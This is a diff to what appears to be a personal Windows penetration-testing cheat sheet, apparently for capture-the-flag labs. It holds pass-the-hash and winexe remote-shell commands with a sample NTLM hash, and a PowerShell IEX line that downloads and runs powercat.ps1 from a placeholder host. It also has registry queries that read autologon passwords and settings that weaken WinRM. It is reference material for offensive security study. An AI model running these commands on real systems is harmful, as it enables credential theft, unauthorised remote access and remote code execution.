@@ -494,35 +494,58 @@ C:\>type C:\Users\BlueTeam\backup.zip:pass
 #Execute cmdline application
 cmd /c 'application.exe'
 
+
+
 #Disable Script execution
 Get-ExecutionPolicy
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
+
+
+
 
 #Get alternate data stream for a windows file 
 #copying or moving file to linux deletes the stream
 get-item .\filename.txt -stream *
 get-content .\filename.txt - stream root.txt
 
+
+
+
 #Authenticate over the share
 net use I: \\x.x.x.x\C$ /user:administrator "1234test"
 type I:\Users\Administrator\Desktop\root.txt
+
 
 
 #Copy Binary file (/b binary or /a ascii text file)
 copy /b C:\Users\Administrator\.jenkins\nc64.exe nc64.exe
         1 file(s) copied.
 
+
+
 #change permission of file to be read by user
 icacls root.txt /grant user:(F)
 processed file: root.txt
 Successfully processed 1 files; Failed processing 0 files
 
-#5 year old Pass the hash  (should not work)
+
+
+#Pass the hash
 pth-winexe -U domain/administrator%e0fb1fb85756c24235ff238cbe81fe00 //x.x.x.x cmd.exe
+
+
+
+#Execute shell (will need password)
+winexe -U Administrator //10.10.10.82 cmd.exe
+
+
 
 #mimikatz
 #extract hash pin kerberos tickets from memory
 perform pass-the-hash/pass-the-ticket / build Golden Tickets
+
+
+
 
 #Dump windows 7 logon
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
@@ -534,23 +557,34 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | f
 IEX (New-Obect System.Net.Webclient).DownloadString('http://x.x.x.x/powercat.ps1')
 #Connections/File Transfer/Shells/DNS and UDP/Relays/Payloads/TCP Port Scanner
 
+
+
 #Enable WinRM (Windows Remote Management)
 #BlueTeam (Victim)
 Enable-PSRemoting -Force
+
+
 
 #Check if WinRM is enabled BlueTeam (Victim)
 winrm set winrm/config/client/auth @{Basic="true"}
 winrm set winrm/config/service/auth @{Basic="true"}
 winrm set winrm/config/service '@{AllowUnencrypted="true"}'
 
+
+
 #Powershell enable WinRM
 Set-Item -Path "WSMan:\localhost\Service\AllowUnencrypted" -Value $true
+
+
 
 #Eanble WinRM over HTTP
 winrm quickconfig
 
+
+
 #Check which windows Features are installed
 (Get-WindowsFeatures).Where{$PSItem.Installer}
+
 
 
 #Port information
@@ -663,25 +697,42 @@ nc -nvlp 2337
 
 
 
-
 #Checks AutoLogon registry settings
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+
+
 
 #Enable WinRM
 winrm quickconfig
 winrm enumerate winrm/config/listener
 winrm get winrm/config
 
+
+
 #show logged on users
 query session
+
+
 
 #show networking information
 route print
 arp -a
 ipconfig
 
+
+
 #list group policies
 gpresult /r /scope computer
 
+
+
 #Displays connected domain
 echo %logonserver%
+
+
+
+#Parse out windows version from system info
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+
